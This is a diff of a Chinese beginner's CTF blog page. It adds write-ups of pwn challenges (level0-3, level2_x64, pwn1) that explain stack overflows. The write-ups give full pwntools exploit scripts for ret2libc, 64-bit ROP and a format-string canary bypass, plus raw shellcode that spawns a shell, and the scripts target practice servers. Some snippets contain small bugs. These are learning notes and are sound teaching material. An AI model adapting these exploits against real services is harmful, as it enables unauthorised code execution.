@@ -62,20 +62,235 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
-    <article id="post-web张" class="post-web张 post type-post status-publish format-standard hentry">
+    <article id="post-pwn3_x64_2_str" class="post-pwn3_x64_2_str post type-post status-publish format-standard hentry">
     <!---->
 
       <header class="entry-header">
         
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2019/07/27/pwn3_x64_2_str/">pwn level3 level2_x64及pwn1</a>
+    </h1>
+  
+
+        
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/27/web张/" data-id="cjyl9y2830003pgvwekokyd08" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/27/pwn3_x64_2_str/" data-id="cjylalajf0001fcvww2uxnesl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <h1 id="小白的第二天-——web安全"><a href="#小白的第二天-——web安全" class="headerlink" title="小白的第二天 ——web安全"></a>小白的第二天 ——web安全</h1><h2 id="题型分类："><a href="#题型分类：" class="headerlink" title="题型分类："></a>题型分类：</h2><ol>
+        <p>#level3与level2_x64及pwn1总结</p>
+<p>##level3<br>在Ubuntu虚拟机里用checksec 文件名命令，查看保护机制，程序是32位，用./文件名命令，运行程序，再用IDA打开，结合分析程序的执行逻辑。发现vulnerable_function()函数里存在栈溢出漏洞，看函数列表，没有callsystem函数，也没有_system函数，也没有/bin/sh字符串，但题给了libc库，肯定要用到啊，用IDA打开，发现有/bin/sh字符串，system函数，而且发现源程序里有write函数，用这个函数泄露出我们想要的地址（就是write函数真正的地址）.再利用，libc库中函数偏移值相等这一原理，求出更多需要的地址（就是system,/bin/sh的地址），在实行覆盖，执行system函数，得到shell.</p>
+<p>exp如下：</p>
+<pre><code> from pwn import* 
+ context.log_level=&apos;DEBUG&apos;
+ p=remote(&quot;pwn2.jarvisoj.com&quot;,9879)
+ plt_write_addr=0x08048340
+ got_write_addr=0x0804A018
+ main_addr=0x08048484
+ p.recvline()
+ payload_one=&apos;a&apos;*(0x88+0x4)+p32(plt_write_addr)+p32(main_addr)+p32(1)+p32(got_write_addr)+p32(4)
+p.send(payload_one)
+write_addr=u32(p.recv(4))
+libc=ELF(&quot;libc-2.19.so&quot;)
+libc_system=libc.symbols[&quot;system&quot;]
+libc_binsh=next(libc.search(&quot;/bin/sh&quot;))
+libc_write=libc.symbols[&quot;write&quot;]
+
+x=write_addr-libc_write
+system_addr=x+libc_system
+binsh_addr=x+libc_binsh
+payload=&apos;a&apos;*0x88+&apos;a&apos;*4+p32(system_addr)+p32(0)+p32(binsh_addr)
+
+p.sendline(payload)
+p.interactive()</code></pre><p>原理就是：大原理还是栈溢出，小原理就是：利用plt,  got.plt,  libc,之间的关系及write函数求我们需要的地址.</p>
+<p>##level2_x64<br>首先在Ubuntu虚拟机里用checksec 文件名命令，查看防护信息，NX enabled状态，不能用shellcode.<br>用IDA打开，与32位level2一样，有_system函数，有/bin/sh字符串，原理也和32位level2一样，不同的是与32位，传参方式不同，64位用寄存器传参，存第一个参数的寄存器就是rdi，用<strong>ROPgadget –binary level2_x64（level2_x6<br>4就是文件名） –only “pop|ret”</strong> 命令查看rdi的地址，传参方式就是 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                 payload=&apos;a&apos;*(0x80+0x8)+p64(rdi_addr)+p32(sh_addr)+p32(system_add)+0x8*&apos;a&apos;</span><br><span class="line">先写寄存器地址（rdi——addr），再写字符串/bin/sh的地址（sh_addr），再写（system_addr）的地址，意思就是：把/bin/sh先存到rdi里，又作为参数传给system_addr函数，因此达到构造后门的目的.最后加上的</span><br><span class="line">0x8*&apos;a&apos;是用来覆盖_system函数形成栈的rbp的，这一题中，覆盖不覆盖都可以，有的题必须要覆盖.</span><br><span class="line"></span><br><span class="line">exp如下：</span><br></pre></td></tr></table></figure>
+
+<pre><code>from pwn import *
+
+r=remote(&quot;pwn2.jarvisoj.com&quot;,9882)
+
+f_addr=0x00000000004006b3
+
+s_addr=0x00000000004004C0
+
+bin_addr=0x0000000000600A90
+
+payload=&apos;a&apos;*(0x80+0x8)+p64(f_addr)+p64(bin_addr)+p64(s_addr)+&apos;a&apos;*0x8
+
+r.sendline(payload)
+r.interactive()</code></pre><p>原理参考32位的level2，<strong>本题重点是明白x64位的传参方式与32位的区别，并会构造payload</strong></p>
+<p>##pwn1，格式化字符串漏洞<br>查看保护机制，查看是32位还是64位，本题是32位，NX是disabled，有canary保护.运行一下程序，知道程序的运行流程，用IDA打开，分析程序的运行流程，找出漏洞点.经分析发现get_message函数里存在栈溢出漏洞.并且printf()函数，没有格式化，所以可利用print()函数打印出我们所需要的地址，实行覆盖，构造后门函数，得到shell.</p>
+<p>涉及知识：gdb调试，栈的结构，栈中距离的计算.</p>
+<p>exp如下：</p>
+<pre><code>1.    from pwn import *
+2.    #shellcode=asm(shellcraft.sh())
+3.    shellcode=&quot;\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f&quot; \
+&quot;\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0&quot; \&quot;\x0b\xcd\x80\n&quot;
+      context.log_level=&apos;debug&apos;
+4.    #p=remote(&quot;172.16.80.240&quot;,8000)
+5.    p=process(&quot;./pwn1&quot;)
+6.    p=recvuntil(&quot;name:&quot;)
+7.    p.sendline(&apos;%p.&apos;*40)
+8.    leak_data=p.recvuntil(&apos;messages:&apos;)
+9.    address=leak_data.split(&apos;.&apos;)
+11.   for i in range(len(address)):
+      print str(i)+&quot;:&quot;+str(address[i])
+12.   canary=address[30]
+13.   print &quot;canary=&quot;+canary
+14.   prev_ebp_addre=address[33]
+15.   print &quot;leakebp_addr=&quot;+prev_ebp_addr
+16.   real_ebp_addr=int(prev_ebp_addr,16)-144
+16.   shellcode_addr=real_ebp_addr+8
+17.   payload=&apos;a&apos;*100+p32(int(canary,16))+&apos;a&apos;*12+p32(shellcode_addr)+shellcode
+18.   p.sendline(payload)
+19.   p.interactive()</code></pre><p>注释：2.,3.</p>
+<hr>
+<p><strong>shellcode=asm(shellcraft.sh())=”\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xd2\x52\x68\x2f\x2f” <br>     “\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0” &quot;\x0b\xcd\x80\n</strong></p>
+<p>   7.发送40个“%p.”</p>
+<p>   9.用‘.’分割leak_data,存入address数组</p>
+<p>   11.遍历数组打印出数组中的所有元素</p>
+<p>   12.13.14.15.gdb调试查看栈的结构，找出canary的位置是31，ebp是34</p>
+<p>   <strong>16.144是这样算得的，泄露出来的ebp的地址-ebp真正的地址=一个偏移量，此时偏移量等于144，所以，泄露出来的ebp的地址-这个偏移量就是ebp的真正的地址.<br>    为什么要加8呢？是这样的：想想栈的结构，p32(shellcode_addr)覆盖的是函数返回地址，在ebp的下面，就是ebp真正地址+4的位置，shellcode_addr就要放在real_ebp_addr+8的位置,shellcode放在其后给shellcode_addr传参.</strong></p>
+<p>17.先解释覆盖的过程：</p>
+<p> ‘a’<em>100覆盖canary之前栈的东西，p32(int(cabary,16))覆盖canary的位置，确保了canary一样，绕过了保护机制，’a’</em>12覆盖了canary到ebp的栈中的东西，p32(shellcode_addr)覆盖函数返回地址，shellcode给shellcode_addr传参.</p>
+<p>  <strong>还是栈的结构</strong></p>
+<p>再解释</p>
+<p> 100是用源程序中给定的栈的大小是0x70（0x70=112）+ebp（0x4=4）-栈顶到canary的距离（12）-canary本身（4）=100</p>
+<p>12是canary到栈底的距离</p>
+<p> **原理就是：大方面的原理还是栈溢出，小方面的原理就是printf()函数没有格式化，以至于我们可以利用它来泄露出我们想要的地址，就是canary及ebp的地址，再利用栈溢出进行覆盖，得到shell.</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/07/27/pwn3_x64_2_str/">
+    <time datetime="2019-07-26T16:00:00.000Z" class="entry-date">
+        2019-07-27
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-pwn012" class="post-pwn012 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2019/07/25/pwn012/">pwn level0，1，2</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/25/pwn012/" data-id="cjylaebgr0004o8vwbf14yhrw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <a id="more"></a>
+<p>#pwn level0 、 level1 、 level2总结</p>
+<p>##pwn题初识</p>
+<p>   初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。</p>
+<p>  pwn题要干嘛：构造或者伪造后门函数，得到shell。</p>
+<p>  看懂pwn题exp参考：pwntools使用简介<a href="https://blog.csdn.net/qq_29343201/article/details/51337025" title="pwntools使用简介" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##level0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">用IDA打开，找到main函数，F5反编汇后看到伪C 代码</span><br><span class="line">![伪C代码如下](https://i.imgur.com/DzBhVFo.png)</span><br><span class="line"></span><br><span class="line">双击查看vulnerable_function()函数内容，发现栈溢出. 查看函数列表，发现callsystem函数（即后门函数），双击查看。有“/bin/sh”，即终端，所以直接用此函数的地址覆盖，函数返回地址.</span><br><span class="line"></span><br><span class="line">exp如下：</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">s_addr=0x400596</span><br><span class="line"></span><br><span class="line">p=remote(&quot;111.198.29.45&quot;,39645)</span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">运行脚本获得shell，输入ls，cat flag命令，即可得flag.</span><br><span class="line"></span><br><span class="line">**原理：本来就有后门，无需构造，直接覆盖即可。**</span><br></pre></td></tr></table></figure>
+
+<p>##level1</p>
+<p>在虚拟机终端，用file 文件名命令，查看该文件是32位的，用checksec 文件名命令，查看文件保护机制.<br>用IDA打开，查看伪C代码，看代码，看vulnerable_function()函数代码，发现栈溢出，同时要知道程序是什么个程序.看函数列表发现并没有callsystem后门函数，所以需要我们自己构造.怎么构造呢？发现vulnerable_function()函数里输出了buf的地址，所以就可以用buf的地址覆盖函数返回地址，又因为NX防护没开，所以用shellcode写入buf，伪造后门函数。</p>
+<p>exp1如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">       from pwn import *</span><br><span class="line"></span><br><span class="line">      shellcode=asm(shellcraft.sh())</span><br><span class="line">      io=remote(&quot;pwn2.jarvisoj.com&quot;,9877)   </span><br><span class="line"></span><br><span class="line">      text=io.recvline()[14: -2]</span><br><span class="line">      buf_addr=int(text,16)</span><br><span class="line">      payload=shellcode+&apos;a&apos;*(0x88+0x4-len(shellcode))+p32(buf_addr)</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      io.interactive()</span><br><span class="line">      io.close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp2如下：</span><br></pre></td></tr></table></figure>
+
+<pre><code>from pwn import *
+context(arch=&apos;i386&apos;,os=&apos;linux&apos;)
+p=remote(&quot;pwn2.jarvisoj.com&quot;,9877)
+p.recvuntil(&quot;this:&quot;)
+text=p.recv(10)
+buf_addr=int(text,16)
+p.recvline() #接收 \n,可有可无
+payload=asm(shellcraft.sh()).ljust(0x88)+&apos;a&apos;*0x4+p32(buf_addr)
+p.sendline(payload)
+p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是shellcraft.sh()，也是/bin/sh，也就是终端）写入buf，把函数返回地址覆盖成buf的地址.</strong></p>
+<p>##level2</p>
+<p>依然是用file 文件名，命令查该看文件是32位，checksec 文件名命令，查看该文件的防护信息.<br>用IDA打开该文件，没有callsystem函数，NX是enabled，所以也不能用shellcode，查看伪C代码vulnerable_function()里，发现栈溢出，用字符串搜索可以看到有个/bin/sh的字符串，函数列表里有个_system函数.这是个突破点，利用这个原理构造后门函数. 就是把_system的地址传入，由于调了_system这个函数，程序又相当于新建立了一个栈，所以得用一个东西覆盖它的函数返回地址. </p>
+<p>exp如下：</p>
+<pre><code>
+      from pwn import *           
+      system_addr=0x08048320    
+      p=remote(&quot;pwn2.jarvisoj.com&quot;,9878)  
+      sh_addr=0x0804A024
+      payload=&apos;a&apos; * (0x88 + 0x4)+p32(system_addr)+p32(0)+p32(sh_addr)  
+      p.sendline(payload)       
+      p.interactive()
+
+**原理就是：自己构造后门函数，根据_system函数的地址，字符串/bin/sh的地址，栈的结构，明白payload中每一段的意思.**</code></pre>
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/07/25/pwn012/">
+    <time datetime="2019-07-25T06:09:47.000Z" class="entry-date">
+        2019-07-25
+    </time>
+</a>
+    
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+
+
+  
+    <article id="post-web张" class="post-web张 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2019/07/19/web张/">第二天 ---web安全</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/19/web张/" data-id="cjylaebgo0003o8vw1c53b6hb" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <a id="more"></a>
+<h1 id="小白的第二天-——web安全"><a href="#小白的第二天-——web安全" class="headerlink" title="小白的第二天 ——web安全"></a>小白的第二天 ——web安全</h1><h2 id="题型分类："><a href="#题型分类：" class="headerlink" title="题型分类："></a>题型分类：</h2><ol>
 <li>php代码审计：</li>
 </ol>
 <ul>
@@ -142,81 +357,16 @@
     </div><!-- .entry-content -->
 
     <footer class="entry-meta">
-    <a href="/2019/07/27/web张/">
-    <time datetime="2019-07-27T08:21:57.131Z" class="entry-date">
-        2019-07-27
+    <a href="/2019/07/19/web张/">
+    <time datetime="2019-07-19T06:09:47.000Z" class="entry-date">
+        2019-07-19
     </time>
 </a>
     
     
-    </footer>
-</article>
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
 
-
-
-
-
-
-  
-    <article id="post-pwn012" class="post-pwn012 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/27/pwn012/" data-id="cjyl9y27x0002pgvwr61d4u6a" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>#pwn level0 、 level1 、 level2总结</p>
-<p>##pwn题初识</p>
-<p>   初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。</p>
-<p>  pwn题要干嘛：构造或者伪造后门函数，得到shell。</p>
-<p>  看懂pwn题exp参考：pwntools使用简介<a href="https://blog.csdn.net/qq_29343201/article/details/51337025" title="pwntools使用简介" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##level0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">用IDA打开，找到main函数，F5反编汇后看到伪C 代码</span><br><span class="line">![伪C代码如下](https://i.imgur.com/DzBhVFo.png)</span><br><span class="line"></span><br><span class="line">双击查看vulnerable_function()函数内容，发现栈溢出. 查看函数列表，发现callsystem函数（即后门函数），双击查看。有“/bin/sh”，即终端，所以直接用此函数的地址覆盖，函数返回地址.</span><br><span class="line"></span><br><span class="line">exp如下：</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">s_addr=0x400596</span><br><span class="line"></span><br><span class="line">p=remote(&quot;111.198.29.45&quot;,39645)</span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">运行脚本获得shell，输入ls，cat flag命令，即可得flag.</span><br><span class="line"></span><br><span class="line">**原理：本来就有后门，无需构造，直接覆盖即可。**</span><br></pre></td></tr></table></figure>
-
-<p>##level1</p>
-<p>在虚拟机终端，用file 文件名命令，查看该文件是32位的，用checksec 文件名命令，查看文件保护机制.<br>用IDA打开，查看伪C代码，看代码，看vulnerable_function()函数代码，发现栈溢出，同时要知道程序是什么个程序.看函数列表发现并没有callsystem后门函数，所以需要我们自己构造.怎么构造呢？发现vulnerable_function()函数里输出了buf的地址，所以就可以用buf的地址覆盖函数返回地址，又因为NX防护没开，所以用shellcode写入buf，伪造后门函数。</p>
-<p>exp1如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">       from pwn import *</span><br><span class="line"></span><br><span class="line">      shellcode=asm(shellcraft.sh())</span><br><span class="line">      io=remote(&quot;pwn2.jarvisoj.com&quot;,9877)   </span><br><span class="line"></span><br><span class="line">      text=io.recvline()[14: -2]</span><br><span class="line">      buf_addr=int(text,16)</span><br><span class="line">      payload=shellcode+&apos;a&apos;*(0x88+0x4-len(shellcode))+p32(buf_addr)</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      io.interactive()</span><br><span class="line">      io.close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp2如下：</span><br></pre></td></tr></table></figure>
-
-<pre><code>from pwn import *
-context(arch=&apos;i386&apos;,os=&apos;linux&apos;)
-p=remote(&quot;pwn2.jarvisoj.com&quot;,9877)
-p.recvuntil(&quot;this:&quot;)
-text=p.recv(10)
-buf_addr=int(text,16)
-p.recvline() #接收 \n,可有可无
-payload=asm(shellcraft.sh()).ljust(0x88)+&apos;a&apos;*0x4+p32(buf_addr)
-p.sendline(payload)
-p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是shellcraft.sh()，也是/bin/sh，也就是终端）写入buf，把函数返回地址覆盖成buf的地址.</strong></p>
-<p>##level2</p>
-<p>依然是用file 文件名，命令查该看文件是32位，checksec 文件名命令，查看该文件的防护信息.<br>用IDA打开该文件，没有callsystem函数，NX是enabled，所以也不能用shellcode，查看伪C代码vulnerable_function()里，发现栈溢出，用字符串搜索可以看到有个/bin/sh的字符串，函数列表里有个_system函数.这是个突破点，利用这个原理构造后门函数. 就是把_system的地址传入，由于调了_system这个函数，程序又相当于新建立了一个栈，所以得用一个东西覆盖它的函数返回地址. </p>
-<p>exp如下：</p>
-<pre><code>
-      from pwn import *           
-      system_addr=0x08048320    
-      p=remote(&quot;pwn2.jarvisoj.com&quot;,9878)  
-      sh_addr=0x0804A024
-      payload=&apos;a&apos; * (0x88 + 0x4)+p32(system_addr)+p32(0)+p32(sh_addr)  
-      p.sendline(payload)       
-      p.interactive()
-
-**原理就是：自己构造后门函数，根据_system函数的地址，字符串/bin/sh的地址，栈的结构，明白payload中每一段的意思.**</code></pre>
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2019/07/27/pwn012/">
-    <time datetime="2019-07-27T08:21:56.995Z" class="entry-date">
-        2019-07-27
-    </time>
-</a>
-    
-    
     </footer>
 </article>
 
@@ -241,7 +391,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/19/第一天__10种基本工具/" data-id="cjyl9y28d0005pgvwde5ynnyr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/19/第一天__10种基本工具/" data-id="cjylaebh90007o8vwsqi7r9tt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -283,7 +433,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/12/Window命令小结及Python基本语法/" data-id="cjyl9y27o0001pgvwac0w2gdg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/12/Window命令小结及Python基本语法/" data-id="cjylaebgg0001o8vwtwo0eoce" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -328,7 +478,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/10/Frist-Blood/" data-id="cjyl9y2730000pgvwmoipb2go" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/10/Frist-Blood/" data-id="cjylaebg60000o8vwkbxrq2uy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -374,7 +524,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/10/hello-world/" data-id="cjyl9y2870004pgvwkmqew9in" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/06/10/hello-world/" data-id="cjylaebgm0002o8vwdebui01u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -437,11 +587,15 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
       <ul>
         
           <li>
-            <a href="/2019/07/27/web张/">(no title)</a>
+            <a href="/2019/07/27/pwn3_x64_2_str/">pwn level3 level2_x64及pwn1</a>
           </li>
         
           <li>
-            <a href="/2019/07/27/pwn012/">(no title)</a>
+            <a href="/2019/07/25/pwn012/">pwn level0，1，2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/web张/">第二天 ---web安全</a>
           </li>
         
           <li>
@@ -450,10 +604,6 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
         
           <li>
             <a href="/2019/06/12/Window命令小结及Python基本语法/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2019/06/10/Frist-Blood/">Frist Blood</a>
           </li>
         
       </ul>
@@ -465,7 +615,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
   <aside class="widget">
     <h3 class="widget-title">Tags</h3>
     <div class="widget-content">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">2</span></li></ul>
     </div>
   </aside>
 
@@ -474,7 +624,7 @@ p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是she
   <aside class="widget">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget-content tagcloud">
-      <a href="/tags/web/" style="font-size: 10px;">web</a>
+      <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web/" style="font-size: 10px;">web</a>
     </div>
   </aside>
 
